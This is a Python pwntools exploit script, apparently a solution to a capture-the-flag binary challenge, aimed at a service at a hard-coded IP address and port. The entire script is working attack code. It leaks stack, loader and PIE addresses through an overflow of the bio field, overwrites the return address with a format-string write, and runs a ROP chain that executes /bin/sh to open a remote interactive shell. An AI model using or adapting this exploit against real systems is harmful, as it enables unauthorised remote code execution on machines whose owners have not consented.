#!/usr/bin/env python3
# Template edited by M0ngi

from pwn import *
from time import sleep

exe = ELF("./main")

context.binary = exe
r = None
nc = "nc 20.83.177.185 4001"


# Helper functions
def sendln(x):
    sleep(0.5)
    r.sendline(x)
recvuntil   = lambda x: r.recvuntil(x)
readln      = lambda : r.readline()


# Clean logging
def log(txt, value=None):
    if value:
        print(txt, ' '*(25-len(txt)), ':', value)
    else:
        print(txt)


# Log int value as hex
def logh(txt, value):
    log(txt, hex(value))


# Padding for format string exploits
def padPayload(s, i=0, size=100):
    if isinstance(s, str):
        s = s.encode()
    
    return s + b"\x90"*(size - 8*i - len(s))


# Handle connection
def conn():
    global nc
    
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        addr, port = nc.strip()[3:].split(' ')
        r = remote(addr, int(port))
    return r


def setUName(name):
    if isinstance(name, str):
        name = name.encode()
    
    sendln(b'1')
    sendln(name)
    recvuntil(b'Welcome! ')
    res = readln().strip()
    return res


def setBio(bio):
    if isinstance(bio, str):
        bio = bio.encode()
    
    sendln(b'3')
    sendln(bio)
    recvuntil(b'>> ')
    

def setBirthday(birthday):
    if isinstance(birthday, str):
        birthday = birthday.encode()
    
    sendln(b'2')
    sendln(birthday)
    recvuntil(b'>> ')


def showInfo(norecv = False):
    sendln(b'4')
    if not norecv:
        print("h")
        recvuntil(b'Username ')
        recvuntil(b'Bio: ')
        readln()
        return recvuntil(b'1. Set Usern')[:-len(b'1. Set usern')]


def main():
    global r
    r = conn()
    
    # Main stack leak
    payload = 'A'*(96-40) + 'B'*6
    
    #pause()
    setBio(payload)
    #pause()
    leak = showInfo().split(b'\n')
    
    stack_leak  = u64(leak[-1].ljust(8, b'\0'))
    struct_adr  = stack_leak - 0x9f
    date_adr    = struct_adr + 9
    bin_sh      = date_adr + 40
    ret_adr     = stack_leak - 0xb7
    
    #log('Leak', leak)
    logh('Stack leak', stack_leak)
    logh('Struct adr', struct_adr)
    logh('Date adr', date_adr)
    logh('Ret adr', ret_adr)
    print()
    
    #pause()
    
    # LD Leak
    payload = 'A'*(104-40) + 'B'*6
    setBio(payload)
    leak = showInfo().split(b'\n')
    
    ld_leak = u64(leak[-1].ljust(8, b'\0'))
    ld_base = ld_leak - 0x19da7
    
    #log('Leak', leak)
    logh('LD Leak', ld_leak)
    logh('LD Base', ld_base)
    print()
    
    # PIE Leak
    payload = 'A'*(345-40) + 'B'*6
    setBio(payload)
    # r.interactive()
    leak = showInfo().split(b'\n')
    
    pie_leak = u64(leak[-1].ljust(8, b'\0'))
    pie_base = (pie_leak - 0x10) << 8
    
    #log('Leak', leak)
    logh('PIE Leak', pie_leak)
    logh('PIE Base', pie_base)
    print()
    
    pause()
    
    # ROP Gads
    POP_5_RET           = ld_base + 0x000000000001d085 # add rsp, 0x110; mov eax, r12d; pop r12; ret;
    SYSCALL             = ld_base + 0x0000000000001a97 # syscall;
    POP_RDI             = ld_base + 0x000000000000118d # pop rdi; ret;
    POP_RSI             = ld_base + 0x0000000000001d28 # pop rsi; ret;
    POP_RAX_RDX_RBX     = ld_base + 0x00000000000011ce # pop rax; pop rdx; pop rbx; ret;
    
    # Prepare for format string write
    POP_5_BYTES = [POP_5_RET&0xffff, ((POP_5_RET) >> 16) & 0xffff, ((POP_5_RET) >> 32) & 0xffff]
    POP_5_BYTES_sorted = list(POP_5_BYTES)
    POP_5_BYTES_sorted.sort()
    
    logh('Gadget', POP_5_RET)
    log('Gadget bytes', list(map(hex, POP_5_BYTES)))
    
    # Format String payload
    payload = b'\0'
    payload += '%{}x%61$hn%{}x%60$hn%{}x%59$hn'.format(POP_5_BYTES_sorted[0]-1, POP_5_BYTES_sorted[1]-POP_5_BYTES_sorted[0], POP_5_BYTES_sorted[2]-POP_5_BYTES_sorted[1]).encode()
    
    setBirthday(payload)

    # ROP Chain payload
    rop_chain = b""
    rop_chain += p64(POP_RSI) + p64(0)
    rop_chain += p64(POP_RAX_RDX_RBX) + p64(59) + p64(0) + p64(0)
    rop_chain += p64(POP_RDI) + p64(bin_sh)
    rop_chain += p64(SYSCALL)
    
    log('ROP Len', len(rop_chain)) # 72
    
    payload = b"/bin/sh\0" + b"\x90"*207 # Padding
    payload += rop_chain
    payload += b"\x98"*(112 - len(rop_chain))
    
    # Used by format string payload
    payload += p64(ret_adr + 2*POP_5_BYTES.index(POP_5_BYTES_sorted[2])) # 59
    payload += p64(ret_adr + 2*POP_5_BYTES.index(POP_5_BYTES_sorted[1])) # 60
    payload += p64(ret_adr + 2*POP_5_BYTES.index(POP_5_BYTES_sorted[0])) # 61
    payload += p64(date_adr) # used by setUName payload
    
    setBio(payload)
    
    payload = ".%96$hhn"
    log('SetUName', setUName(payload))
    
    showInfo(True)
    
    r.interactive()


if __name__ == "__main__":
    main()

